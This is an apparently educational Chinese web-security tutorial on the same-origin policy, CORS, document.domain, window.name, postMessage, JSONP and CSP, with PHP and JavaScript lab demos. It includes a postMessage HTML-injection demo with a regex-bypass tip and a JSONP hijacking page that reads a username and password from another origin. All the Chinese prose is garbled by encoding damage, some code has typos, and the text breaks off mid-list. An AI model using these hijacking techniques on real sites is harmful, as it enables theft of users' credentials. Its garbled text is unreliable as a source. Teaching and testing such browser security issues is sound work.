    <content><![CDATA[<h1 id="SOP-CORS-CSP"><a href="#SOP-CORS-CSP" class="headerlink" title="SOP_CORS_CSP"></a>SOP_CORS_CSP</h1><h2 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h2><ul>
<li>â­ é˜»æ­¢ä¸€ä¸ªé¡µé¢ä¸Šçš„æ¶æ„è„šæœ¬é€šè¿‡é¡µé¢çš„DOMå¯¹è±¡è·å¾—è®¿é—®å¦ä¸€ä¸ªé¡µé¢ä¸Šæ•æ„Ÿä¿¡æ¯çš„æƒé™</li>
<li>åŒæºçš„ç‰¹å¾<ul>
<li>åŒåè®® å¦‚ï¼š<a href="https://exp.org" target="_blank" rel="noopener">https://exp.org</a> ä¸ <a href="http://exp.org" target="_blank" rel="noopener">http://exp.org</a> ä¸åŒæº</li>
<li>åŒç«¯å£ å¦‚ï¼š<a href="http://exp.org" target="_blank" rel="noopener">http://exp.org</a> ä¸ <a href="http://exp.org:8080" target="_blank" rel="noopener">http://exp.org:8080</a> ä¸åŒæº</li>
<li>åŒåŸŸå å¦‚ï¼š<a href="http://aaa.org" target="_blank" rel="noopener">http://aaa.org</a> ä¸ <a href="http://bbb.org" target="_blank" rel="noopener">http://bbb.org</a> ä¸åŒæº</li>
</ul>
</li>
<li>åŒæºç­–ç•¥çš„é™åˆ¶<ul>
<li>é™åˆ¶äº†ä¸åŒæºä¹‹é—´çš„è¯·æ±‚äº¤äº’ï¼Œä¾‹å¦‚åœ¨ä½¿ç”¨XMLHttpRequestæˆ–fetchå‡½æ•°æ—¶åˆ™ä¼šå—åˆ°åŒæºç­–ç•¥çš„çº¦æŸ</li>
<li>é™åˆ¶æµè§ˆå™¨ä¸­ä¸åŒæºçš„æ¡†æ¶ä¹‹é—´æ˜¯ä¸èƒ½è¿›è¡Œjsçš„äº¤äº’æ“ä½œçš„ï¼Œä¾‹å¦‚é€šè¿‡iframeå’Œwindow.openäº§ç”Ÿçš„ä¸åŒæºçš„çª—å£</li>
</ul>
</li>
<li>åŒæºç­–ç•¥çš„æ³¨è§£<ul>
<li>å¯¹äº<code>&lt;a&gt;</code>ã€<code>&lt;script&gt;</code>ã€<code>&lt;img&gt;</code>ã€<code>&lt;video&gt;</code>ã€<code>&lt;link&gt;</code>è¿™ç±»å±æ€§å¸¦æœ‰srcï¼Œhrefçš„æ ‡ç­¾ï¼Œå…è®¸è·¨åŸŸåŠ è½½</li>
<li>è·¨åŸŸè¯·æ±‚å¯ä»¥å‘å‡ºï¼Œä½†æ˜¯æµè§ˆå™¨æŸ¥çœ‹è¿”å›åŒ…å‘ç°è·¨åŸŸä¸”æ— CORSå¤´åˆ™ä¼šä¸¢å¼ƒï¼Œè€Œä¸”ä¸åŒå­åŸŸä¹‹é—´é»˜è®¤æ˜¯ä¸åŒæºçš„</li>
<li>IEæœªå°†ç«¯å£å·åŠ å…¥åˆ°åŒæºç­–ç•¥çš„ç»„æˆéƒ¨åˆ†ä¹‹ä¸­ï¼Œå› æ­¤company.com:81/index.htmlå’Œcompany.com/index.htmlå±äºåŒæºå¹¶ä¸”ä¸å—ä»»ä½•é™åˆ¶</li>
</ul>
</li>
</ul>
<h2 id="è·¨åŸŸèµ„æºå…±äº«"><a href="#è·¨åŸŸèµ„æºå…±äº«" class="headerlink" title="è·¨åŸŸèµ„æºå…±äº«"></a>è·¨åŸŸèµ„æºå…±äº«</h2><h3 id="0X00-CORSç®€ä»‹"><a href="#0X00-CORSç®€ä»‹" class="headerlink" title="0X00 CORSç®€ä»‹"></a>0X00 CORSç®€ä»‹</h3><ul>
<li>CORSè·¨åŸŸèµ„æºå…±äº«ï¼ˆOrigin/Access-Control-Allow-Originï¼‰<ul>
<li>AJAXçš„XMLHttpRequestè¯·æ±‚</li>
<li>ç®€å•è¯·æ±‚ï¼ˆsimple requestï¼‰â€“ HEAD/GET/POST</li>
<li>éç®€å•è¯·æ±‚ï¼ˆnot-so-simple requestï¼‰â€“PUT/OPTIONS</li>
</ul>
</li>
<li>JSONPï¼ˆJSON with Padding)ï¼Œåº”ç”¨JSONçš„ä¸€ç§æ–°æ–¹æ³•<ul>
<li>JOSNPå…è®¸é¡µé¢æ¥å—å¦ä¸€ä¸ªåŸŸçš„JSONæ•°æ®ï¼Œé€šè¿‡åœ¨é¡µé¢å¢åŠ ä¸€ä¸ªå¯ä»¥ä»å…¶å®ƒåŸŸåŠ è½½å¸¦æœ‰å›è°ƒçš„JSONå“åº”çš„<code>&lt;script&gt;</code>æ ‡ç­¾</li>
</ul>
</li>
<li>ä»£ç†ï¼ˆé€šè¿‡æ¥å£çš„æ–¹å¼ï¼Œåå°è°ƒç”¨phpæ–‡ä»¶è·å–ç„¶åè¿”å›ç»™å‰ç«¯ï¼‰</li>
<li>è·¨æ–‡æ¡£é€šä¿¡ï¼ˆpostMessage()ä¼šå¼‚æ­¥çš„è§¦å‘windowä¸Šçš„onmessageäº‹ä»¶ï¼‰</li>
<li>document.domainï¼ˆè§£å†³ä¸åŒwindowä¹‹é—´ä¸èƒ½è¿›è¡Œäº¤äº’æ“ä½œçš„é—®é¢˜ï¼‰</li>
<li>window.nameï¼ˆwindow.nameåœ¨é¡µé¢çš„ç”Ÿå‘½å‘¨æœŸé‡Œå…±äº«ä¸€ä¸ªwindow.nameï¼‰</li>
<li>WebSocketï¼ˆæµè§ˆå™¨å…è®¸è„šæœ¬ç›´è¿ä¸€ä¸ªWebSocketåœ°å€è€Œä¸ç®¡åŒæºç­–ç•¥ï¼‰</li>
</ul>
<h3 id="0X01-CORS"><a href="#0X01-CORS" class="headerlink" title="0X01 CORS"></a>0X01 CORS</h3><ul>
<li>â–² CORSå¤´å°±æ˜¯ä¸ºäº†çªç ´ä¸åŒæºä¹‹é—´çš„è¯·æ±‚äº¤äº’è¿™ä¸€é™åˆ¶è€Œäº§ç”Ÿçš„</li>
<li>åªè¦HTTPè¿”å›<code>Access-Control-Allow-Origin:http://test2.www.xyz</code>ï¼Œtest2.<a href="http://www.xyzçš„è·¨åŸŸè¯·æ±‚çš„å“åº”ä¼šè¢«æµè§ˆå™¨æ­£ç¡®çš„è¿”å›" target="_blank" rel="noopener">www.xyzçš„è·¨åŸŸè¯·æ±‚çš„å“åº”ä¼šè¢«æµè§ˆå™¨æ­£ç¡®çš„è¿”å›</a></li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?</span><br><span class="line">    header(&quot;Access-Control-Allow-Origin:http://test2.www.xyz&quot;);</span><br><span class="line">    echo &quot;flag&#123;this_is_flag&#125;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">//Consoleå°è¾“å…¥</span><br><span class="line">fetch(&apos;//test1.www.xyz/1.php&apos;).then(function(data)&#123;</span><br><span class="line">  return data.text()</span><br><span class="line">&#125;).then(function(data)&#123;</span><br><span class="line">  console.log(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/cors-example.png" alt="cors-example"></p>
<ul>
<li>å¦‚æœè®¾ç½®<code>Access-Control-Allow-Origin:*</code>ï¼Œåˆ™æ‰€æœ‰çš„è·¨åŸŸè®¿é—®å“åº”éƒ½ä¼šè¢«å…è®¸</li>
<li>å¦‚æœè¯·æ±‚éœ€è¦å¸¦ä¸ŠCookieï¼Œåˆ™éœ€è¦æœåŠ¡å™¨è®¾ç½®<code>Access-Control-Allow-Credentials:true</code><ul>
<li>å¦‚æœè®¾ç½®<code>Access-Control-Allow-Origin:*</code>ï¼Œåˆ™ä¸ç®¡æœ‰æ²¡æœ‰è®¾ç½®<code>Access-Control-Allow-Credentials:true</code>ï¼Œå¸¦Cookieçš„è¯·æ±‚éƒ½ä¼šå¤±è´¥</li>
</ul>
</li>
</ul>
<h3 id="0X02-document-domain"><a href="#0X02-document-domain" class="headerlink" title="0X02 document.domain"></a>0X02 document.domain</h3><ul>
<li>é’ˆå¯¹åŒæºç­–ç•¥çš„ç¬¬äºŒä¸ªé™åˆ¶ï¼Œä¸åŒçª—å£ä¹‹é—´çš„åŒæºé™åˆ¶</li>
<li>â–² åªé€‚ç”¨äºé¡¶çº§åŸŸåç›¸åŒå­åŸŸåä¸åŒä¹‹é—´çš„åŒæºç­–ç•¥ -&gt; ä¸åŒå­åŸŸåä¹‹é—´é»˜è®¤ä¸åŒæºï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡è®¾ç½®document.domainä¸ºç›¸åŒçš„æ›´é«˜çº§åŸŸåï¼Œæ¥ä½¿ä¸åŒå­åŸŸåŒæº</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//ä¸è®¾ç½®document.domain</span><br><span class="line">----test1.www.xyz/window_name_1.php</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xtz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">----test2.www.xyz/window_name_2.php</span><br><span class="line">&lt;h1&gt;123&lt;/h&gt;p</span><br><span class="line"></span><br><span class="line">//è®¾ç½®document.domain</span><br><span class="line">----test1.www.xyz/window_name_1.php</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//bbb.evoa.me/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;document.domain = &quot;www.xyz&quot;&lt;/script&gt;</span><br><span class="line">----test1.www.xyz/window_name_2.php</span><br><span class="line">&lt;h1&gt;123&lt;/h&gt;</span><br><span class="line">&lt;script&gt;document.domain = &quot;www.xyz&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/document-name-alert.png" alt="document-name-alert"></p>
<ul>
<li><p>æ³¨é‡Š</p>
<ul>
<li><p>document.domainåªå¯ä»¥è¢«è®¾ç½®ä¸ºä»–çš„å½“å‰åŸŸæˆ–å…¶å½“å‰åŸŸçš„çˆ¶åŸŸ</p>
</li>
<li><p>document.domainçš„èµ‹å€¼æ“ä½œä¼šå¯¼è‡´ç«¯å£å·è¢«é‡å†™ä¸ºNULLï¼Œæ‰€ä»¥test1.<a href="http://www.xyzä»…è®¾ç½®document.domainä¸ºwww.xyzå¹¶ä¸èƒ½ä¸www.xyzè¿›è¡Œé€šä¿¡ï¼Œwww.xyzçš„é¡µé¢ä¹Ÿå¿…é¡»èµ‹å€¼ä¸€æ¬¡ä½¿åŒæ–¹ç«¯å£ç›¸åŒä»è€Œé€šè¿‡æµè§ˆå™¨çš„åŒæºæ£€æµ‹ã€‚è¿™ä¹ˆåšçš„ç›®çš„æ˜¯ï¼Œå¦‚æœå­åŸŸæœ‰XSSï¼Œé‚£ä¹ˆä»–çš„çˆ¶åŸŸéƒ½å­˜åœ¨å®‰å…¨éšæ‚£" target="_blank" rel="noopener">www.xyzä»…è®¾ç½®document.domainä¸ºwww.xyzå¹¶ä¸èƒ½ä¸www.xyzè¿›è¡Œé€šä¿¡ï¼Œwww.xyzçš„é¡µé¢ä¹Ÿå¿…é¡»èµ‹å€¼ä¸€æ¬¡ä½¿åŒæ–¹ç«¯å£ç›¸åŒä»è€Œé€šè¿‡æµè§ˆå™¨çš„åŒæºæ£€æµ‹ã€‚è¿™ä¹ˆåšçš„ç›®çš„æ˜¯ï¼Œå¦‚æœå­åŸŸæœ‰XSSï¼Œé‚£ä¹ˆä»–çš„çˆ¶åŸŸéƒ½å­˜åœ¨å®‰å…¨éšæ‚£</a></p>
</li>
<li><p>åŒä¸€çª—ä½“ä¸åŒçª—å£ä¹‹é—´ï¼ˆiframeä¸­çš„æˆ–window.openæ‰“å¼€çš„ï¼‰æ˜¯èƒ½å¤Ÿè·å–åˆ°å½¼æ­¤çš„windowå¯¹è±¡çš„ï¼Œå¦‚iframe.contentWindowå¯ä»¥è·å–iframeçš„windowå¯¹è±¡ï¼Œä½†æ˜¯ä¸åŒæºçš„æƒ…å†µä¸‹è¿™ä¸ªwindowå¯¹è±¡çš„å¤§éƒ¨åˆ†å±æ€§å’Œæ–¹æ³•æ˜¯å—é™åˆ¶çš„</p>
<p><img src="/images/sop_cors_csp/cors/document-name-cors.png" alt="document-name-cors"></p>
</li>
</ul>
</li>
<li><p>â–² å¦‚æœæŸä¸ªå­åŸŸä¸ºäº†å’Œæ ¹åŸŸé€šä¿¡ï¼Œæ ¹åŸŸè®¾ç½®äº†document.domainä¸ºæ ¹åŸŸï¼Œé‚£ä¹ˆå…¶ä»–å­åŸŸå¦‚æœæœ‰xssæ¼æ´å¯ä»¥ç›´æ¥è·¨åŒæºæ”»å‡»æ ¹åŸŸå’ŒåŒæ ·è®¾ç½®äº†document.domainçš„å…¶ä»–å­åŸŸ</p>
</li>
</ul>
<h3 id="0X03-window-name"><a href="#0X03-window-name" class="headerlink" title="0X03 window.name"></a>0X03 window.name</h3><ul>
<li>windowå¯¹è±¡æœ‰ä¸ªnameå±æ€§ï¼Œè¯¥å±æ€§æœ‰ä¸ªç‰¹å¾<ul>
<li>åœ¨ä¸€ä¸ªçª—å£(window)çš„ç”Ÿå‘½å‘¨æœŸå†…ï¼Œçª—å£è½½å…¥çš„æ‰€æœ‰çš„é¡µé¢éƒ½æ˜¯å…±äº«ä¸€ä¸ªwindow.nameçš„</li>
<li>æ¯ä¸ªé¡µé¢å¯¹window.nameéƒ½æœ‰è¯»å†™çš„æƒé™</li>
<li>window.nameæ˜¯æŒä¹…å­˜åœ¨ä¸€ä¸ªçª—å£è½½å…¥è¿‡çš„æ‰€æœ‰é¡µé¢ä¸­ï¼Œå¹¶ä¸ä¼šå› æ–°é¡µé¢çš„è½½å…¥è€Œè¿›è¡Œé‡ç½®</li>
</ul>
</li>
<li>â–² window.nameå‡ ä¹ä¸å—åŒæºç­–ç•¥çš„å½±å“</li>
<li>æµ‹è¯•ä»£ç <ul>
<li>è®¿é—®æµç¨‹ï¼šé€šè¿‡Consoleå°çš„xx.contentWindow.nameè®¿é—®iframeä¸­çš„nameå±æ€§ï¼Œæµè§ˆå™¨è¿”å›äº†è·¨åŸŸè®¿é—®æ‹’ç»ã€‚ä½†æ˜¯æˆ‘ä»¬é€šè¿‡è®¾ç½®iframeçš„srcä¸º3.php (3.phpå¯ä»¥ä¸ä¸1.phpåŒåŸŸ)ï¼Œåœ¨iframeä¸­çš„æ‰€æœ‰é¡µé¢å…±äº«window.nameï¼Œç„¶å3.phpä¸­çš„è„šæœ¬è®¿é—®åˆ°ä¸åŒæºçš„é¡µé¢2.phpå¹¶è·å–åˆ°äº†window.name</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;iframe id=&apos;xx&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.name = &quot;flag&#123;this_is_flag&#125;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">----test1.www.xyz/3.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    alert(window.name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/window-name-alert.png" alt="window-name-alert"></p>
<ul>
<li>æ³¨é‡Š<ul>
<li>window.nameçš„å€¼åªèƒ½æ˜¯å­—ç¬¦ä¸²çš„å½¢å¼ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²çš„å¤§å°æœ€å¤§èƒ½å…è®¸2Må·¦å³ç”šè‡³æ›´å¤§çš„ä¸€ä¸ªå®¹é‡ï¼Œå…·ä½“å–å†³äºä¸åŒçš„æµè§ˆå™¨</li>
<li>â–² ä¸è¦æŠŠæ•æ„Ÿæ•°æ®å­˜åœ¨window.nameä¸­ï¼Œå¦åˆ™æ•æ„Ÿæ•°æ®å¯ä»¥è¢«ä»»ä½•å…¶ä»–ç½‘é¡µçš„JSè„šæœ¬è·å–</li>
</ul>
</li>
</ul>
<h3 id="0X04-location-hash"><a href="#0X04-location-hash" class="headerlink" title="0X04 location.hash"></a>0X04 location.hash</h3><ul>
<li>location.hashå…¶å®å°±æ˜¯URLçš„é”šéƒ¨åˆ†(ä»#å·å¼€å§‹çš„éƒ¨åˆ†)</li>
<li>åŸç†<ul>
<li>æ”¹å˜hashå¹¶ä¸ä¼šå¯¼è‡´é¡µé¢åˆ·æ–°ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨hashå€¼æ¥è¿›è¡Œæ•°æ®ä¼ é€’</li>
<li>ä¸åŒåŸŸä¸‹location.hashä¹Ÿæ˜¯ä¸èƒ½ç›¸äº’è¯»å–çš„</li>
</ul>
</li>
<li>å…·ä½“åšæ³•<ul>
<li>AåŸŸçš„é¡µé¢aåŠ è½½ä¸€ä¸ªiframeï¼Œè®¾ç½®iframeçš„srcä¸ºBåŸŸçš„bé¡µé¢+#ä¼ è¾“ç»™bçš„æ•°æ®</li>
<li>æ­¤æ—¶bé¡µé¢çš„jsè„šæœ¬å¯ä»¥é€šè¿‡è¯»å–location.hashè·å¾—é¡µé¢aä¼ è¿‡æ¥çš„æ•°æ®ï¼Œç„¶ååœ¨bé¡µé¢å†ç”Ÿæˆä¸€ä¸ªiframeï¼ŒsrcæŒ‡å‘AåŸŸçš„é¡µé¢c+#ä¼ è¾“ç»™açš„æ•°æ®</li>
<li>ç”±äºé¡µé¢cä¸é¡µé¢aåŒåŸŸåŒæºï¼Œæ‰€ä»¥é¡µé¢cçš„è„šæœ¬å¯ä»¥ä¿®æ”¹açš„locaition.hash</li>
</ul>
</li>
</ul>
<h3 id="0X05-PostMessage"><a href="#0X05-PostMessage" class="headerlink" title="0X05 PostMessage"></a>0X05 PostMessage</h3><ul>
<li>â–² window.postMessage()æ–¹æ³•å¯ä»¥å®‰å…¨åœ°å®ç°è·¨æºé€šä¿¡</li>
<li>å½“è¢«è°ƒç”¨æ—¶ï¼Œä¼šåœ¨æ‰€æœ‰é¡µé¢è„šæœ¬æ‰§è¡Œå®Œæ¯•ä¹‹åå‘ç›®æ ‡çª—å£æ´¾å‘ä¸€ä¸ªMessageEventæ¶ˆæ¯å‡½æ•°<ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå‘é€çš„æ¶ˆæ¯</li>
<li>ç¬¬äºŒä¸ªå‚æ•°æ˜¯åŒ¹é…å‘é€ç»™çš„çª—å£çš„urlåœ°ï¼ˆå¯ä»¥ä½¿ç”¨*ï¼Œä»£è¡¨æ— é™åˆ¶é€šé…ï¼‰ï¼Œè‹¥ç›®æ ‡urlå’Œæ­¤å‚æ•°ä¸åŒ¹é…ï¼Œæ¶ˆæ¯å°±ä¸ä¼šè¢«å‘é€</li>
</ul>
</li>
<li>è¢«æ¥å—çª—å£åˆ™å¯ä»¥é€šè¿‡ç›‘å¬messageäº‹ä»¶æ¥è·å–æ¥å—ä¿¡æ¯</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">        alert(e.data);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    parent.postMessage(&apos;test&apos;,&apos;*&apos;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/postmessage-example.png" alt="postmessage-example"></p>
<ul>
<li>æ¶æ„ä»£ç æµ‹è¯•ï¼ˆäº‹ä»¶ç›‘å¬æ²¡æœ‰åˆ¤æ–­äº‹ä»¶çš„æ¥æºï¼‰</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?php</span><br><span class="line">setcookie(&apos;flag&apos;,&apos;flag&#123;this_is_flag&#125;&apos;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;h1 id=&quot;name&quot;&gt;&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">        document.getElementById(&apos;name&apos;).innerHTML = e.data</span><br><span class="line">        &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">----test2.www.xyz/evil.php</span><br><span class="line">&lt;iframe id=&quot;iframe&quot; src=&quot;//test1.www.xyz/1.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">//æ­£åˆ™è¿‡æ»¤çš„1.php</span><br><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;flag&quot;,&quot;flag&#123;this_is_flag&#125;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;h1 id=&quot;name&quot;&gt;&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">        if(/^http:\/\/.*www\.xyz$/.test(e.origin))</span><br><span class="line">        document.getElementById(&apos;name&apos;).innerHTML = e.data;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;   --------------&gt; ç»•è¿‡æ–¹æ³•ï¼šéœ€è¦ä¸€ä¸ªå­˜åœ¨åç¼€ä¸ºwww.xyzçš„åŸŸåå³å¯</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/postmessage-alert.png" alt="postmessage-alert"></p>
<h3 id="0X06-JSONP"><a href="#0X06-JSONP" class="headerlink" title="0X06 JSONP"></a>0X06 JSONP</h3><ul>
<li><code>&lt;script&gt;</code>æ ‡ç­¾å¯ä»¥è·¨åŸŸåŠ è½½èµ„æºï¼Œä½†æ˜¯è¿”å›å†…å®¹å¦‚æœä¸ç¬¦åˆJSè¯­æ³•åŒæ ·æ— æ³•è·å–æ•°æ®ï¼ŒJSONPåˆ™æ˜¯é€šè¿‡è¿”å›ç¬¦åˆJSè¯­æ³•çš„æ•°æ®å†…å®¹ä½¿èµ„æºèƒ½å¤Ÿè·¨åŸŸåŠ è½½</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function echoData(data)&#123;</span><br><span class="line">    console.log(&quot;DATA:&quot;,data);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;//test2.www.xyz/2.php?func=echoData&quot;&gt;&lt;/script&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">&lt;?php</span><br><span class="line">    header(&apos;Content-type: application/javascript&apos;);</span><br><span class="line">    $func = $_REQUEST[&apos;func&apos;]??&quot;func&quot;;</span><br><span class="line">    $data = &apos;[&quot;aaa&quot;,&quot;bbb&quot;,&quot;ccc&quot;,&quot;ddd&quot;]&apos;;</span><br><span class="line">    echo $func.&quot;(&quot;.$data.&quot;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/jsonp-example.png" alt="jsonp-example"></p>
<ul>
<li>è¿è¡Œè¿‡ç¨‹ï¼š1.phpé¡µé¢å…ˆè®¾å®šå¥½è¾“å‡ºæ•°æ®çš„å‡½æ•°ï¼Œé€šè¿‡<code>&lt;script&gt;</code>æ ‡ç­¾è¯·æ±‚2.phpå¹¶å¸¦æœ‰å‡½æ•°åå‚æ•°ï¼Œ2.phpæŠŠæ•°æ®å½“å‡½æ•°å‚æ•°ä¼ å…¥å¹¶æ ¹æ®å‡½æ•°åè¾“å‡ºå¯¹åº”å‡½æ•°è°ƒç”¨è¯­å¥ï¼Œ1.phpè·å¾—å“åº”åè‡ªåŠ¨è°ƒç”¨å‡½æ•°å³å¯è·å–æ•°æ®</li>
<li>ä¸å­˜åœ¨ä»»ä½•éªŒè¯çš„JSONPæ¥å£</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test2.www.xyz/evail.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function echoData(data)&#123;</span><br><span class="line">    alert(&quot;usernameï¼š&quot;+data.username+&quot;passwordï¼š&quot;+data.password);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;//test1.www.xyz/1.php?func=echoData&quot;&gt;&lt;/script&gt;</span><br><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?php</span><br><span class="line">    header(&apos;Content-type: application/javascript&apos;);</span><br><span class="line">    $func = $_REQUEST[&apos;func&apos;]??&quot;func&quot;;</span><br><span class="line">    $data = &quot;&#123;&apos;username&apos;:&apos;test1&apos;,&apos;password&apos;:&apos;test1&apos;&#125;&quot;;</span><br><span class="line">    echo $func.&quot;(&quot;.$data.&quot;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/jsonp-username-password.jpg" alt="jsonp-username-password"></p>
<ul>
<li>â–² æœªè®¾ç½®Conten-typeå¯ä»¥å¯¼è‡´åå°„æ€§XSS<ul>
<li>ä½†æ˜¯å°±ç®—è®¾ç½®å¥½äº†Conten-typeä¹Ÿå¯èƒ½ä¼šæœ‰å®‰å…¨éšæ‚£</li>
</ul>
</li>
<li>â–² è¿™ç§ç”¨æˆ·å®Œå…¨å¯æ§ç‚¹å¯ä»¥ç»“åˆå¾ˆå¤šå…¶ä»–ç¼ºé™·äº§ç”Ÿæ¼æ´ï¼Œæ‰€ä»¥è¿™ç§æ¥å£è¿˜åº”è¯¥è¿‡æ»¤éæ³•å­—ç¬¦</li>
<li>é˜²å¾¡æ–¹æ³•<ul>
<li>éªŒè¯refererï¼Œå¾ˆå¤šæ¥å£éªŒè¯refererçš„æ­£åˆ™æœ‰è¯¯ï¼Œå¯ä»¥é€šè¿‡ç»•è¿‡æ­£åˆ™ç»§ç»­æ”»å‡»</li>
<li>éªŒè¯token</li>
</ul>
</li>
</ul>
<h2 id="å†…å®¹å®‰å…¨ç­–ç•¥"><a href="#å†…å®¹å®‰å…¨ç­–ç•¥" class="headerlink" title="å†…å®¹å®‰å…¨ç­–ç•¥"></a>å†…å®¹å®‰å…¨ç­–ç•¥</h2><blockquote>
<p>   CSP, Content Security Policy</p>
</blockquote>
<ul>
<li>å®˜æ–¹è§£é‡Š<ul>
<li>ä¸€ä¸ªé™„åŠ çš„å®‰å…¨å±‚ï¼Œç”¨äºå¸®åŠ©æ£€æµ‹å’Œç¼“è§£æŸäº›ç±»å‹çš„æ”»å‡»ï¼ŒåŒ…æ‹¬è·¨ç«™è„šæœ¬(XSS)å’Œæ•°æ®æ³¨å…¥ç­‰æ”»å‡»ã€‚è¿™äº›æ”»å‡»å¯ç”¨äºå®ç°ä»æ•°æ®çªƒå–åˆ°ç½‘ç«™ç ´åæˆ–ä½œä¸ºæ¶æ„è½¯ä»¶åˆ†å‘ç‰ˆæœ¬ç­‰ç”¨é€”</li>
</ul>
</li>
<li>é€šä¿—ç†è§£<ul>
<li>å¼€å‘è€…æ˜ç¡®å‘Šè¯‰å®¢æˆ·ç«¯ï¼ˆåˆ¶å®šæ¯”è¾ƒä¸¥æ ¼çš„ç­–ç•¥å’Œè§„åˆ™ï¼‰ï¼Œå“ªäº›å¤–éƒ¨èµ„æºæ˜¯å¯ä»¥åŠ è½½å’Œæ‰§è¡Œçš„</li>
</ul>
</li>
<li>æ¦‚å¿µç†è§£<ul>
<li>CSPå°±æ˜¯ä¸€ä¸ªç»Ÿä¸€æœ‰æ•ˆçš„é˜²æ­¢ç½‘ç«™å—åˆ°XSSæ”»å‡»çš„é˜²å¾¡æ–¹æ³•</li>
<li>CSPæ˜¯ä¸€ç§ç™½åå•ç­–ç•¥</li>
</ul>
</li>
</ul>
<h5 id="å¯ç”¨CSP"><a href="#å¯ç”¨CSP" class="headerlink" title="å¯ç”¨CSP"></a>å¯ç”¨CSP</h5><ul>
<li>é€šè¿‡HTTPå¤´ä¿¡æ¯çš„Content-Security-Policyçš„å­—æ®µï¼ˆé…ç½®æ–‡ä»¶æˆ–è€…åç«¯è®¾ç½®ï¼‰</li>
<li>é€šè¿‡ç½‘é¡µçš„<code>&lt;meta&gt;</code>æ ‡ç­¾<ul>
<li><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39;&quot;&gt;</code></li>
</ul>
</li>
<li>ä¿®æ”¹çš„é™åˆ¶<ul>
<li><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39; https://cdn.xxx.com&quot;&gt;</code>  -&gt; contentæ·»åŠ ç™½åå• -&gt; å³å¯ä»¥<code>script</code>æ ‡ç­¾å¼•å…¥cdb</li>
</ul>
</li>
</ul>
<h5 id="å¸¸ç”¨"><a href="#å¸¸ç”¨" class="headerlink" title="å¸¸ç”¨"></a>å¸¸ç”¨</h5><ul>
